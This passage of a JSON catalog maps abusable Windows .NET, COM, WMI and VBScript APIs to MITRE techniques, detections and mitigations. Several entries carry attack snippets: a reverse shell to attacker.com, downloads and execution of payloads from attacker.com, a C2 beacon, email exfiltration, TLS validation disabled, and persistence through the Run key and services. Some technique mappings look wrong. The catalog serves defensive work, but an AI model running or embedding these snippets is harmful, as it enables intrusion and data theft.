      "process_execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "3eb23e1f-eae1-48fd-9860-49c46506e290",
    "name": "System.Diagnostics.ProcessStartInfo",
    "category": "Windows Dotnet Api",
    "subcategory": "process-execution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.Diagnostics",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo",
      "class": "ProcessStartInfo",
      "function": ""
    },
    "techniques": [
      "T1036.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Stealth command execution",
        "technique_id": "T1036.001",
        "description": "Execute hidden processes without window display",
        "code_snippet": "var psi = new ProcessStartInfo(\"cmd.exe\", \"/c whoami\"); psi.WindowStyle = ProcessWindowStyle.Hidden; Process.Start(psi);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of System.Diagnostics.ProcessStartInfo",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "process-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "cc284455-1499-4d20-bf6e-86fd1070fe61",
    "name": "System.IO.File.WriteAllBytes",
    "category": "Windows Dotnet Api",
    "subcategory": "file-operations",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 90
    },
    "api": {
      "namespace": "System.IO",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.io.file.writeallbytes",
      "class": "File",
      "function": ""
    },
    "techniques": [
      "T1105"
    ],
    "abuse_scenarios": [
      {
        "name": "Malware payload drop",
        "technique_id": "T1105",
        "description": "Write payload to disk for execution",
        "code_snippet": "File.WriteAllBytes(\"C:\\\\temp\\\\payload.exe\", payloadBytes);",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.IO.File.WriteAllBytes via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.IO.File.WriteAllBytes",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "file_operations",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "b14c8be4-1d86-48a6-9d5b-7c106b0a9089",
    "name": "System.IO.Pipes.NamedPipeClientStream",
    "category": "Windows Dotnet Api",
    "subcategory": "inter-process-communication",
    "risk": {
      "severity": "High",
      "prevalence": "medium",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 55
    },
    "api": {
      "namespace": "System.IO.Pipes",
      "language": ".NET 3.5+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.io.pipes.namedpipeclientstream",
      "class": "NamedPipeClientStream",
      "function": ""
    },
    "techniques": [
      "T1570"
    ],
    "abuse_scenarios": [
      {
        "name": "Lateral movement via named pipes",
        "technique_id": "T1570",
        "description": "Connect to named pipes to communicate with other processes/machines",
        "code_snippet": "NamedPipeClientStream pipeClient = new NamedPipeClientStream(\".\", \"malware_pipe\");\npipeClient.Connect();\nStreamWriter writer = new StreamWriter(pipeClient);\nwriter.WriteLine(command);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Monitor for NamedPipe connections between processes"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Behavioral detection of unusual named pipe usage"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor named pipe creation and access",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "APT29"
      ],
      "malware_families": [
        "Cobalt Strike"
      ],
      "tools": [
        "Cobalt Strike"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "ipc",
      "lateral-movement"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "f5d232d8-2790-4e29-8a8a-2d210504a639",
    "name": "System.Net.Http.HttpClient",
    "category": "Windows Dotnet Api",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 88
    },
    "api": {
      "namespace": "System.Net.Http",
      "language": ".NET 4.5+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.http.httpclient",
      "class": "HttpClient",
      "function": ""
    },
    "techniques": [
      "T1071.001"
    ],
    "abuse_scenarios": [
      {
        "name": "C2 communication",
        "technique_id": "T1071.001",
        "description": "Establish HTTP(S) command and control channel",
        "code_snippet": "var client = new HttpClient(); var response = await client.GetAsync(\"http://c2-server/cmd\");",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.Net.Http.HttpClient via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.Net.Http.HttpClient",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "network_communication",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "69c46d16-1c46-4588-bbd3-07a9d5265eb5",
    "name": "System.Net.HttpWebRequest.GetResponse",
    "category": "Windows Dotnet Api",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "System.Net",
      "language": ".NET 1.1+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest.getresponse",
      "class": "HttpWebRequest",
      "function": ""
    },
    "techniques": [
      "T1071.001"
    ],
    "abuse_scenarios": [
      {
        "name": "C2 beacon communication",
        "technique_id": "T1071.001",
        "description": "Establish persistent C2 channel over HTTP",
        "code_snippet": "HttpWebRequest req = (HttpWebRequest)WebRequest.Create(\"http://c2.attacker.com/beacon\"); req.Method = \"POST\"; var resp = req.GetResponse();",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Network IDS",
        "effectiveness": "medium",
        "notes": "Monitor for suspicious HTTP beacon patterns"
      },
      {
        "vendor": "Proxy logs",
        "effectiveness": "high",
        "notes": "Detect C2 communication patterns"
      }
    ],
    "mitigation": [
      {
        "category": "network",
        "description": "Block known C2 domains",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "FIN7"
      ],
      "malware_families": [
        "Various malware families"
      ],
      "tools": [
        "Cobalt Strike"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "c2",
      "network"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "d22f4260-47ed-45e0-b3ed-645f2bece400",
    "name": "System.Net.Mail.SmtpClient",
    "category": "Windows Dotnet Api",
    "subcategory": "command-and-control",
    "risk": {
      "severity": "High",
      "prevalence": "low",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 30
    },
    "api": {
      "namespace": "System.Net.Mail",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.mail.smtpclient",
      "class": "SmtpClient",
      "function": ""
    },
    "techniques": [
      "T1048.003"
    ],
    "abuse_scenarios": [
      {
        "name": "Email-based C2 exfiltration",
        "technique_id": "T1048.003",
        "description": "Use SMTP to send stolen data via email",
        "code_snippet": "SmtpClient client = new SmtpClient(\"mail.server.com\");\nMailMessage msg = new MailMessage(\"attacker@domain.com\", \"attacker@domain.com\");\nmsg.Body = exfiltrated_data;\nclient.Send(msg);",
        "detection_difficulty": "medium",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Network IDS",
        "effectiveness": "high",
        "notes": "Monitor for SMTP connections from unusual processes"
      },
      {
        "vendor": "Proxy logs",
        "effectiveness": "high",
        "notes": "Detect SMTP connections to external mail servers"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block external SMTP connections",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "Scattered"
      ],
      "malware_families": [
        "Custom malware"
      ],
      "tools": [
        "Custom scripts"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "c2",
      "exfiltration"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "27b9fb61-b08d-46d1-8d27-a10f09a9dc52",
    "name": "System.Net.ServicePointManager.ServerCertificateValidationCallback",
    "category": "Windows Dotnet Api",
    "subcategory": "evasion",
    "risk": {
      "severity": "High",
      "prevalence": "emerging",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 75
    },
    "api": {
      "namespace": "System.Net",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager.servercertificatevalidationcallback",
      "class": "ServicePointManager",
      "function": ""
    },
    "techniques": [
      "T1557.002"
    ],
    "abuse_scenarios": [
      {
        "name": "SSL certificate bypass",
        "technique_id": "T1557.002",
        "description": "Disable SSL/TLS certificate validation for MITM",
        "code_snippet": "ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, ssl) => true;",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.Net.ServicePointManager.ServerCertificateValidationCallback via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.Net.ServicePointManager.ServerCertificateValidationCallback",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "evasion",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "65d06cd3-930c-43b7-a847-33d6260203f3",
    "name": "System.Net.Sockets.TcpClient",
    "category": "Windows Dotnet Api",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.Net.Sockets",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient",
      "class": "TcpClient",
      "function": ""
    },
    "techniques": [
      "T1086"
    ],
    "abuse_scenarios": [
      {
        "name": "Reverse shell establishment",
        "technique_id": "T1086",
        "description": "Establish raw TCP connection for reverse shell",
        "code_snippet": "var tcp = new TcpClient(\"attacker.com\", 4444); var stream = tcp.GetStream(); /* execute commands over stream */",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of System.Net.Sockets.TcpClient",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "network-communication",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "bacad1ef-dc88-4314-a879-ebe7d6ebd608",
    "name": "System.Net.WebClient",
    "category": "Windows Dotnet Api",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.Net",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient",
      "class": "WebClient",
      "function": ""
    },
    "techniques": [
      "T1105"
    ],
    "abuse_scenarios": [
      {
        "name": "Payload download",
        "technique_id": "T1105",
        "description": "Download and execute remote payloads",
        "code_snippet": "var wc = new WebClient(); var payload = wc.DownloadData(\"http://attacker.com/payload.exe\"); File.WriteAllBytes(\"C:\\\\payload.exe\", payload);",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of System.Net.WebClient",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "network-communication",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "d3a95629-dea8-4bb9-86ee-0d5ee365182e",
    "name": "System.Net.WebClient.DownloadString",
    "category": "Windows Dotnet Api",
    "subcategory": "resource-retrieval",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 80
    },
    "api": {
      "namespace": "System.Net",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring",
      "class": "WebClient",
      "function": ""
    },
    "techniques": [
      "T1105"
    ],
    "abuse_scenarios": [
      {
        "name": "Download and execute remote script",
        "technique_id": "T1105",
        "description": "Fetch PowerShell code from remote server and execute",
        "code_snippet": "WebClient wc = new WebClient(); string code = wc.DownloadString(\"http://attacker.com/payload.ps1\"); System.Diagnostics.Process.Start(\"powershell.exe\", code);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Network IDS",
        "effectiveness": "high",
        "notes": "Monitor HTTP connections from non-browser processes"
      },
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection of suspicious downloads"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block outbound HTTP for sensitive processes",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT29",
        "FIN7"
      ],
      "malware_families": [
        "PowerShell-based malware"
      ],
      "tools": [
        "Cobalt Strike",
        "Empire"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "download",
      "rce"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "c79147c1-8a55-42be-8a3f-6489322f0989",
    "name": "System.Reflection.Assembly.Load",
    "category": "Windows Dotnet Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "emerging",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 72
    },
    "api": {
      "namespace": "System.Reflection",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load",
      "class": "Assembly",
      "function": ""
    },
    "techniques": [
      "T1027.011"
    ],
    "abuse_scenarios": [
      {
        "name": "In-memory code execution",
        "technique_id": "T1027.011",
        "description": "Load and execute .NET assembly from memory without touching disk",
        "code_snippet": "var asm = Assembly.Load(assemblyBytes); asm.GetType(\"Namespace.Class\").GetMethod(\"Method\").Invoke(null, null);",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.Reflection.Assembly.Load via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.Reflection.Assembly.Load",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "code_execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "eb01d3b4-8f37-469c-8acf-0b373a7b8e39",
    "name": "System.Reflection.Emit.DynamicMethod",
    "category": "Windows Dotnet Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "emerging",
      "ease_of_abuse": "hard",
      "likelihood_in_real_attacks": 45
    },
    "api": {
      "namespace": "System.Reflection.Emit",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.reflection.emit.dynamicmethod",
      "class": "DynamicMethod",
      "function": ""
    },
    "techniques": [
      "T1027.011"
    ],
    "abuse_scenarios": [
      {
        "name": "Dynamic IL generation",
        "technique_id": "T1027.011",
        "description": "Generate IL bytecode at runtime to evade static analysis",
        "code_snippet": "var dm = new DynamicMethod(\"Invoke\", null, null); dm.GetILGenerator().Emit(...);",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.Reflection.Emit.DynamicMethod via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.Reflection.Emit.DynamicMethod",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "code_execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "735f3aa5-cf6a-4093-980f-90d18630e47a",
    "name": "System.Reflection.MethodInfo.Invoke",
    "category": "Windows Dotnet Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "System.Reflection",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodinfo.invoke",
      "class": "MethodInfo",
      "function": ""
    },
    "techniques": [
      "T1218.009"
    ],
    "abuse_scenarios": [
      {
        "name": "Reflection-based code execution",
        "technique_id": "T1218.009",
        "description": "Use reflection to invoke methods without direct references",
        "code_snippet": "var method = typeof(Process).GetMethod(\"Start\", new[] { typeof(string) });\nmethod.Invoke(null, new[] { \"cmd.exe\" });",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Monitor for excessive Reflection.Invoke calls"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Behavioral detection of reflection-based execution"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Disable .NET runtime reflection via policy",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "APT29",
        "FIN7"
      ],
      "malware_families": [
        "Powershell Empire",
        "GhostPack"
      ],
      "tools": [
        "Empire",
        "Cobalt Strike"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "reflection",
      "code-execution"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "37ba5513-83e2-4326-8800-5dc06a7dd47e",
    "name": "System.Runtime.InteropServices.Marshal",
    "category": "Windows Dotnet Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.Runtime.InteropServices",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal",
      "class": "Marshal",
      "function": ""
    },
    "techniques": [
      "T1547.014"
    ],
    "abuse_scenarios": [
      {
        "name": "Direct syscall execution",
        "technique_id": "T1547.014",
        "description": "Execute native code from managed .NET",
        "code_snippet": "var funcPtr = Marshal.GetFunctionPointerForDelegate(new Func<int>(NativeMethod)); var func = Marshal.GetDelegateForFunctionPointer<Func<int>>(funcPtr);",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of System.Runtime.InteropServices.Marshal",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "code-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "3a2b6839-4923-4f16-ac2d-49e3f3d09ae7",
    "name": "VBScript - Execute Method",
    "category": "Script Engine",
    "subcategory": "code-execution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "VBScript",
      "language": "VBScript",
      "documentation": "https://learn.microsoft.com/en-us/previous-versions/t0aew7h6(v=vs.85)",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1059.005"
    ],
    "abuse_scenarios": [
      {
        "name": "Living off the land script execution",
        "technique_id": "T1059.005",
        "description": "Execute VBScript from command line",
        "code_snippet": "cscript.exe /nologo script.vbs",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of VBScript - Execute Method",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "script-engine",
      "code-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "218c9734-e963-4de6-8c5d-50d8ebe49d0d",
    "name": "WMI - Win32_DCOMApplication",
    "category": "Windows Com Api",
    "subcategory": "lateral-movement",
    "risk": {
      "severity": "Critical",
      "prevalence": "medium",
      "ease_of_abuse": "hard",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "WMI",
      "language": "PowerShell/VBScript/C#",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-overview",
      "class": "Win32_DCOMApplication",
      "function": ""
    },
    "techniques": [
      "T1021.003"
    ],
    "abuse_scenarios": [
      {
        "name": "DCOM-based RCE",
        "technique_id": "T1021.003",
        "description": "Execute commands on remote systems via DCOM",
        "code_snippet": "Get-WmiObject -Class Win32_DCOMApplication | Where-Object { $_.Name -match 'Excel' } | Invoke-WmiMethod",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "medium",
        "notes": "Monitor for remote WMI method execution"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Behavioral detection of DCOM lateral movement"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict DCOM activation",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "Lazarus"
      ],
      "malware_families": [
        "Cobalt Strike"
      ],
      "tools": [
        "Cobalt Strike"
      ]
    },
    "tags": [
      "windows-com-api",
      "lateral-movement",
      "rce"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "8f5d80bc-4689-40f7-ade6-3b647a9ccd14",
    "name": "WMI - Win32_Process.Create",
    "category": "Windows Com",
    "subcategory": "process-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 80
    },
    "api": {
      "namespace": "WbemScripting",
      "language": "COM",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process",
      "class": "SWbemServices",
      "function": ""
    },
    "techniques": [
      "T1047"
    ],
    "abuse_scenarios": [
      {
        "name": "Remote/local code execution",
        "technique_id": "T1047",
        "description": "Execute arbitrary commands via WMI",
        "code_snippet": "Get-WmiObject Win32_Process -ComputerName target -Credential $cred | Invoke-WmiMethod -Name Create -ArgumentList \"cmd.exe\"",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of WMI - Win32_Process.Create via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of WMI - Win32_Process.Create",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_com",
      "process_execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "2e96e620-a34d-4a09-89b4-d32cd6d6e310",
    "name": "WMI - Win32_Service.Create",
    "category": "Windows Com",
    "subcategory": "persistence",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "WbemScripting",
      "language": "COM",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-service",
      "class": "SWbemServices",
      "function": ""
    },
    "techniques": [
      "T1543.003"
    ],
    "abuse_scenarios": [
      {
        "name": "Service-based persistence",
        "technique_id": "T1543.003",
        "description": "Create Windows service for persistence",
        "code_snippet": "Get-WmiObject Win32_Service -Filter \"Name='NewService'\" | Invoke-WmiMethod -Name Create -ArgumentList \"NewService\",\"C:\\\\malware.exe\"",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of WMI - Win32_Service.Create",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-com",
      "persistence",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "e7de7ef0-badb-42e2-99dc-7c62a9b5977c",
    "name": "WScript.Shell COM Object",
    "category": "Windows Com Api",
    "subcategory": "script-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 90
    },
    "api": {
      "namespace": "WScript.Shell",
      "language": "VBScript/JavaScript",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/wsh/wscript-shell",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1059.005",
      "T1547.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Run command via Exec method",
        "technique_id": "T1059.005",
        "description": "Execute system commands via WScript.Shell.Exec",
        "code_snippet": "Set shell = CreateObject(\"WScript.Shell\")\nshell.Exec \"cmd.exe /c whoami\"",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      },
      {
        "name": "Registry manipulation",
        "technique_id": "T1547.001",
        "description": "Modify registry for persistence",
        "code_snippet": "Set shell = CreateObject(\"WScript.Shell\")\nshell.RegWrite \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Malware\", \"cmd.exe\"",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Monitor script engine process creation"
